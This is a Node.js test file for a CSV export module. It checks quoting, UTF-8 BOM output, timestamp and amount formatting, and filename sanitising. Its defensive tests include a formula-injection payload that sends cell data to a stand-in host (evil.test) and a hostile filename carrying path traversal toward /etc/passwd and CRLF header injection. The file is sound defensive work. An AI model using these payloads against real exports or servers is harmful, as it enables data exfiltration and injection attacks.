import { test } from "node:test";
import assert from "node:assert/strict";
import {
  escapeCsvCell,
  toCsv,
  csvFilename,
  formatCsvAmount,
  formatCsvTimestamp,
  UTF8_BOM,
} from "../src/lib/csv";

test("plain values are emitted unquoted", () => {
  assert.equal(escapeCsvCell("Sunrise Tote Bag"), "Sunrise Tote Bag");
  assert.equal(escapeCsvCell(250000), "250000");
});

test("null and undefined become empty cells, not the words null/undefined", () => {
  assert.equal(escapeCsvCell(null), "");
  assert.equal(escapeCsvCell(undefined), "");
});

test("commas, quotes and newlines are escaped RFC4180-style", () => {
  assert.equal(escapeCsvCell("Hanoi, Vietnam"), '"Hanoi, Vietnam"');
  // Internal quotes are doubled, which is what the existing importer parses.
  assert.equal(escapeCsvCell('He said "hi"'), '"He said ""hi"""');
  assert.equal(escapeCsvCell("line one\nline two"), '"line one\nline two"');
  assert.equal(escapeCsvCell("carriage\rreturn"), '"carriage\rreturn"');
});

test("Vietnamese diacritics pass through unchanged and unquoted", () => {
  // Nothing about a diacritic requires quoting; mangling it here would be
  // the bug the BOM exists to prevent.
  assert.equal(escapeCsvCell("Túi vải bền"), "Túi vải bền");
  assert.equal(escapeCsvCell("Phường Hoàn Kiếm, Hà Nội"), '"Phường Hoàn Kiếm, Hà Nội"');
  assert.equal(escapeCsvCell("Đồng ₫"), "Đồng ₫");
});

test("FORMULA INJECTION — a leading =, +, - or @ is neutralised", () => {
  // Each is prefixed with ' so a spreadsheet treats it as text, and quoted
  // so the prefix cannot be read as structure.
  assert.equal(escapeCsvCell("=SUM(A1:A9)"), `"'=SUM(A1:A9)"`);
  assert.equal(escapeCsvCell("+1234"), `"'+1234"`);
  assert.equal(escapeCsvCell("-20% sale"), `"'-20% sale"`);
  assert.equal(escapeCsvCell("@admin"), `"'@admin"`);
});

test("FORMULA INJECTION — the classic exfiltration payload is defused", () => {
  const payload = '=HYPERLINK("http://evil.test?x="&A1,"click")';
  const escaped = escapeCsvCell(payload);
  assert.ok(escaped.startsWith(`"'=`), "must not begin with a bare =");
  // The value is preserved for a human, not silently destroyed.
  assert.ok(escaped.includes("HYPERLINK"));
});

test("FORMULA INJECTION — leading tab and CR are also guarded", () => {
  // Excel treats a leading tab/CR as a separator even inside quotes.
  assert.ok(escapeCsvCell("\t=1+1").startsWith(`"'`));
  assert.ok(escapeCsvCell("\r=1+1").startsWith(`"'`));
});

test("a value that merely CONTAINS = is not guarded", () => {
  // Only the first character can trigger formula evaluation, so guarding
  // mid-string values would corrupt legitimate data like a SKU.
  assert.equal(escapeCsvCell("SKU=ABC"), "SKU=ABC");
});

test("a document has a BOM, a header row, CRLF rows and a trailing newline", () => {
  const csv = toCsv(["name", "price"], [["Túi", 250000]]);
  assert.ok(csv.startsWith(UTF8_BOM), "Excel needs the BOM to read UTF-8");
  assert.equal(csv, `${UTF8_BOM}name,price\r\nTúi,250000\r\n`);
});

test("column order follows the headers array, never object key order", () => {
  const csv = toCsv(["c", "a", "b"], [[3, 1, 2]]);
  assert.equal(csv, `${UTF8_BOM}c,a,b\r\n3,1,2\r\n`);
});

test("an empty dataset still produces a valid header-only document", () => {
  // A merchant with no orders must get a usable file, not a blank one.
  const csv = toCsv(["order_id", "total_vnd"], []);
  assert.equal(csv, `${UTF8_BOM}order_id,total_vnd\r\n`);
});

test("timestamps are deterministic UTC ISO, not locale-dependent", () => {
  const d = new Date("2026-10-08T14:13:09.054Z");
  assert.equal(formatCsvTimestamp(d), "2026-10-08T14:13:09Z");
  assert.equal(formatCsvTimestamp(null), "");
  assert.equal(formatCsvTimestamp(undefined), "");
});

test("amounts are plain summable digits, never formatted currency", () => {
  // "250.000 ₫" would make the column unsummable in a spreadsheet.
  assert.equal(formatCsvAmount(250000), "250000");
  assert.equal(formatCsvAmount(0), "0");
  assert.equal(formatCsvAmount(null), "");
  assert.equal(formatCsvAmount(Number.NaN), "");
  assert.ok(!formatCsvAmount(250000).includes("₫"));
  assert.ok(!formatCsvAmount(250000).includes("."));
});

test("filenames are safe and carry no secret or identifier", () => {
  const name = csvFilename("orders");
  assert.match(name, /^orders-\d{4}-\d{2}-\d{2}\.csv$/);
});

test("a filename cannot be used to inject a path or break the header", () => {
  // Defence in depth: the route only ever passes a fixed label, but if a
  // caller ever passed something hostile it must not escape the quotes in
  // Content-Disposition or traverse a directory.
  const hostile = csvFilename("orders", '../../etc/passwd"; drop\r\nX-Evil: 1');
  assert.ok(!hostile.includes(".."));
  assert.ok(!hostile.includes("/"));
  assert.ok(!hostile.includes('"'));
  assert.ok(!hostile.includes("\r"));
  assert.ok(!hostile.includes("\n"));
  assert.match(hostile, /^orders-[a-z0-9-]*-?\d{4}-\d{2}-\d{2}\.csv$/);
});

test("a dataset label is sanitised too", () => {
  assert.equal(csvFilename("../orders").startsWith("orders-"), true);
});

test("a round trip survives the existing importer's parsing rules", () => {
  // The escaping contract has to match what product-csv.ts already parses:
  // quoted fields, doubled internal quotes, embedded commas and newlines.
  const tricky = 'Túi "đặc biệt", 2 dòng\nhàng hai';
  const csv = toCsv(["name"], [[tricky]]);
  const body = csv.slice(UTF8_BOM.length).split("\r\n")[1] + "\r\n" + csv.slice(UTF8_BOM.length).split("\r\n")[2];
  assert.ok(body.includes('""đặc biệt""'), "internal quotes doubled");
  assert.ok(body.startsWith('"'), "field is quoted");
});

test("a negative NUMBER stays numeric — the formula guard must not turn it into text", () => {
  // Regression: escapeCsvCell(-5) used to emit "'-5", which a spreadsheet
  // reads as text, silently breaking a numeric column. stock_available is
  // onHand - reserved and can legitimately go negative under
  // over-reservation, and the products export pushes it as a raw number.
  // A number is never a formula, so it must never be guarded.
  assert.equal(escapeCsvCell(-5), "-5");
  assert.equal(escapeCsvCell(-20), "-20");
  assert.equal(escapeCsvCell(-0.5), "-0.5");
  assert.equal(escapeCsvCell(0), "0");
  assert.equal(escapeCsvCell(1234), "1234");
});

test("a negative value supplied as a STRING is still guarded", () => {
  // The distinction is the type, not the glyph: a string beginning with -
  // can be a formula, so it keeps its guard.
  assert.equal(escapeCsvCell("-5"), `"'-5"`);
  assert.equal(escapeCsvCell("-20% sale"), `"'-20% sale"`);
  // formatCsvAmount() returns a string, so a negative amount stays guarded
  // rather than silently changing behaviour here.
  assert.equal(escapeCsvCell(formatCsvAmount(-500)), `"'-500"`);
});

test("non-finite numbers do not slip past the guard as bare text", () => {
  // String(NaN)/String(Infinity) start with a letter, so neither is a
  // formula vector; asserted so a future change to isNumeric cannot
  // accidentally emit something a spreadsheet evaluates.
  assert.equal(escapeCsvCell(Number.NaN), "NaN");
  assert.equal(escapeCsvCell(Number.POSITIVE_INFINITY), "Infinity");
  assert.equal(escapeCsvCell(Number.NEGATIVE_INFINITY), `"'-Infinity"`);
});
